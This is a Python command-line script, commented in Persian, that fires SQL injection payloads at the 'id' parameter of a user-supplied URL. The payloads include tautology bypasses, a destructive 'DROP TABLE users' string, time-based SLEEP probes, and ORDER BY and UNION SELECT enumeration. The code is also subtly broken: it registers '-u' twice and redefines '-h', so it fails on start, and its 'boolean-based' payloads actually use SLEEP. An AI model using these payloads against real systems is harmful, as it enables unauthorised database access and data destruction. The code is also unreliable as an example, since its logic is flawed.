import argparse
import requests

class SQLInjector:
    def __init__(self, target_url, headers=None, cookies=None):
        self.target_url = target_url
        self.headers = headers
        self.cookies = cookies

    def _prepare_request(self, parameter, payload):
        # آماده‌سازی درخواست برای ارسال
        params = {parameter: payload}
        request_info = f"Requesting {self.target_url} with parameters: {params}"
        return params, request_info

    def _test_response(self, response, parameter, payload):
        # بررسی پاسخ برای تایید آسیب‌پذیری
        if "error" in response.text:
            print(f"SQL Injection vulnerability confirmed for parameter '{parameter}' with payload '{payload}'.")
        else:
            print(f"No SQL Injection vulnerability found for parameter '{parameter}' with payload '{payload}'.")

    def test_injection(self, parameter, payloads):
        for payload in payloads:
            params, request_info = self._prepare_request(parameter, payload)
            try:
                response = requests.get(self.target_url, params=params, headers=self.headers, cookies=self.cookies)
                self._test_response(response, parameter, payload)
            except requests.RequestException as e:
                print(f"An error occurred while testing parameter '{parameter}' with payload '{payload}': {e}")
            finally:
                print(request_info)

    def blind_sqli_test(self, parameter, technique):
        # تست Blind SQL Injection با استفاده از تکنیک‌های مختلف
        if technique == "time-based":
            payloads = ["1' AND IF(1=1, SLEEP(5), 0) --", "1' AND IF(1=2, SLEEP(5), 0) --"]
        elif technique == "boolean-based":
            payloads = ["1' AND SLEEP(5) --", "1' AND SLEEP(5) AND '1'='1' --"]
        else:
            print("Invalid Blind SQL Injection technique specified.")
            return

        for payload in payloads:
            params, request_info = self._prepare_request(parameter, payload)
            try:
                response = requests.get(self.target_url, params=params, headers=self.headers, cookies=self.cookies)
                if response.elapsed.total_seconds() >= 5:
                    print(f"Blind SQL Injection vulnerability confirmed for parameter '{parameter}' with payload '{payload}'.")
                else:
                    print(f"No Blind SQL Injection vulnerability found for parameter '{parameter}' with payload '{payload}'.")
            except requests.RequestException as e:
                print(f"An error occurred while testing parameter '{parameter}' with payload '{payload}': {e}")
            finally:
                print(request_info)

    def test_order_by(self, parameter):
        # تست قابلیت ORDER BY برای شماره ستون‌های جدول
        payloads = ["1 ORDER BY 1", "1 ORDER BY 2", "1 ORDER BY 3"]
        for payload in payloads:
            params, request_info = self._prepare_request(parameter, payload)
            try:
                response = requests.get(self.target_url, params=params, headers=self.headers, cookies=self.cookies)
                print(f"Testing ORDER BY with payload '{payload}':")
                print(response.text)
            except requests.RequestException as e:
                print(f"An error occurred while testing ORDER BY with payload '{payload}': {e}")
            finally:
                print(request_info)

    def test_union_select(self, parameter):
        # تست قابلیت UNION SELECT برای دریافت اطلاعات از جداول دیگر
        payloads = ["1 UNION SELECT 1,2,3", "1 UNION SELECT NULL,2,3"]
        for payload in payloads:
            params, request_info = self._prepare_request(parameter, payload)
            try:
                response = requests.get(self.target_url, params=params, headers=self.headers, cookies=self.cookies)
                print(f"Testing UNION SELECT with payload '{payload}':")
                print(response.text)
            except requests.RequestException as e:
                print(f"An error occurred while testing UNION SELECT with payload '{payload}': {e}")
            finally:
                print(request_info)

def main():
    parser = argparse.ArgumentParser(description="SQL Injection vulnerability tester")
    parser.add_argument("-u", "--url", dest="url", help="Target URL")
    parser.add_argument("-B", "--blind", dest="blind", help="Blind SQL Injection technique (time-based or boolean-based)")
    parser.add_argument("-o", "--order-by", dest="order_by", action="store_true", help="Test ORDER BY functionality")
    parser.add_argument("-u", "--union-select", dest="union_select", action="store_true", help="Test UNION SELECT functionality")
    parser.add_argument("-h", "--help", action="help", help="Show this help message and exit")
    args = parser.parse_args()

    if not args.url:
        parser.error("You must specify a target URL using the -u option")

    target_url = args.url
    headers = {"User-Agent": "Mozilla/5.0"}
    cookies = {"session": "abcdef123456"}
    injector = SQLInjector(target_url, headers=headers, cookies=cookies)

    # تست آسیب‌پذیری SQL Injection
    parameter = "id"
    payloads = ["1' OR '1'='1", "1; DROP TABLE users; --"]

    # اضافه کردن بایپس‌های معروف
    payloads += [
        "1' OR '1'='1'--",
        "1' OR 1=1--",
        "1' OR 1=1#",
        "1' OR 1=1/*",
        "1' OR '1'='1--",
        "1' OR '1'='1#",
        "1' OR '1'='1/*",
        "1' OR 1=1--",
        "1' OR 1=1#",
        "1' OR 1=1/*",
        "1' OR '1'='1--",
        "1' OR '1'='1#",
        "1' OR '1'='1/*",
        "1' OR 'x'='x",
        "1' OR 'x'='x#",
        "1' OR 'x'='x/*",
        "1' OR 'x'='y",
        "1' OR 'x'='y#",
        "1' OR 'x'='y/*",
        "1' OR 'a'='a",
        "1' OR 'a'='a#",
        "1' OR 'a'='a/*",
        "1' OR 'a'='b",
        "1' OR 'a'='b#",
        "1' OR 'a'='b/*",
    ]

    injector.test_injection(parameter, payloads)

    if args.blind:
        injector.blind_sqli_test(parameter, args.blind)

    if args.order_by:
        injector.test_order_by(parameter)

    if args.union_select:
        injector.test_union_select(parameter)

if __name__ == "__main__":
    main()
